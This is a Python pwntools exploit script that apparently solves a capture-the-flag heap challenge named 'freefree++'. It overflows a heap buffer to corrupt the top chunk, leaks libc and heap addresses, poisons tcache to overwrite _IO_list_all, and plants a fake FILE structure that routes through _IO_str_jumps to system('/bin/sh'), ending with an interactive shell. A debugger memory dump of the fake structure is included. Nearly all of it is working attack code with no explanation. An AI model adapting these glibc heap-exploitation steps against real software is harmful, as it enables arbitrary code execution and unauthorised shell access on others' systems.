#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./freefree++"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+405
        b *main+448
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def alloc(val: str, size: int):
    cmd = "{}=malloc({})".format(val, size)
    p.sendlineafter('>', cmd)

def gets(val: str, buf):
    cmd = "gets({})".format(val)
    p.sendlineafter('>', cmd)
    p.sendline(buf)

def puts(val: str):
    cmd = "puts({})".format(val)
    p.sendlineafter('>', cmd)
    p.recvuntil('\x20')
    return p.recvline().rstrip(b'\n')

alloc('A', 0x10)
# overwrite top.size
gets('A', b'a' * 0x18 + p64(0xd71))
alloc('B', 0xd50)# free old top (-> unsorted bin)
alloc('C', 0xd40)# alloc old top

unsorted = u64(puts('C') + b'\0' * 2)
log.info("leak: " + hex(unsorted))
libc_base = unsorted - 0x3ebca0
log.info("libc base: " + hex(libc_base))
libc.address = libc_base

# overwrite top.size
gets('B', b'b' * 0xd58 + p64(0x2a1))
alloc('D', 0xd50)# free old top (-> tcache)
gets('D', b'd' * 0xd58 + p64(0x2a1))
alloc('E', 0x280)
alloc('F', 0x270)
# leak heap address
heap_leak = u64(puts('F') + b'\0' * 2)
log.info("heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x21d70
log.info("heap base: " + hex(heap_base))

# overwrite _IO_list_all
log.debug("_IO_list_all: " + hex(libc.symbols['_IO_list_all']))
gets('B', b'b' * 0xd58 + p64(0x281) + p64(libc.symbols['_IO_list_all']))
alloc('H', 0x270)
alloc('I', 0x270)# allocate _IO_list_all
gets('I', p64(heap_base + 0x280))

binsh_addr = next(libc.search(b"/bin/sh"))
buf_end = (binsh_addr - 100) // 2

_IO_str_jumps = libc.symbols['_IO_str_jumps']
log.debug("_IO_str_jumps: " + hex(_IO_str_jumps))
one_gadget_offset = 0x4f2c5
one_gadget_addr = libc_base + one_gadget_offset
# making fake struct
gets('A',
    b'\0'* 0x28 +
    p64(buf_end + 1) +
    b'\0'* 0x10 +
    p64(buf_end) +
    b'\0'* 0x90 +
    p64(_IO_str_jumps) +
    p64(libc.symbols['system'])
)

"""
0x55c927810280|+0x0000|000: 0x0000000000000000
0x55c927810288|+0x0008|001: 0x0000000000000000
0x55c927810290|+0x0010|002: 0x0000000000000000
0x55c927810298|+0x0018|003: 0x0000000000000000
0x55c9278102a0|+0x0020|004: 0x0000000000000000
0x55c9278102a8|+0x0028|005: 0x00007f7b497b3e37  ->  'rac_digits > 0'
0x55c9278102b0|+0x0030|006: 0x0000000000000000
0x55c9278102b8|+0x0038|007: 0x0000000000000000
0x55c9278102c0|+0x0040|008: 0x00007f7b497b3e36  ->  'frac_digits > 0'
0x55c9278102c8|+0x0048|009: 0x0000000000000000
0x55c9278102d0|+0x0050|010: 0x0000000000000000
0x55c9278102d8|+0x0058|011: 0x0000000000000000
0x55c9278102e0|+0x0060|012: 0x0000000000000000
0x55c9278102e8|+0x0068|013: 0x0000000000000000
0x55c9278102f0|+0x0070|014: 0x0000000000000000
0x55c9278102f8|+0x0078|015: 0x0000000000000000
0x55c927810300|+0x0080|016: 0x0000000000000000
0x55c927810308|+0x0088|017: 0x0000000000000000
0x55c927810310|+0x0090|018: 0x0000000000000000
0x55c927810318|+0x0098|019: 0x0000000000000000
0x55c927810320|+0x00a0|020: 0x0000000000000000
0x55c927810328|+0x00a8|021: 0x0000000000000000
0x55c927810330|+0x00b0|022: 0x0000000000000000
0x55c927810338|+0x00b8|023: 0x0000000000000000
0x55c927810340|+0x00c0|024: 0x0000000000000000
0x55c927810348|+0x00c8|025: 0x0000000000000000
0x55c927810350|+0x00d0|026: 0x0000000000000000
0x55c927810358|+0x00d8|027: 0x00007f7b499e8360 <_IO_str_jumps>  ->  0x0000000000000000
0x55c927810360|+0x00e0|028: 0x00007f7b4964f440 <system>  ->  0xfa66e90b74ff8548
"""

# exit
p.sendlineafter('>', "exit(0)")

p.interactive()
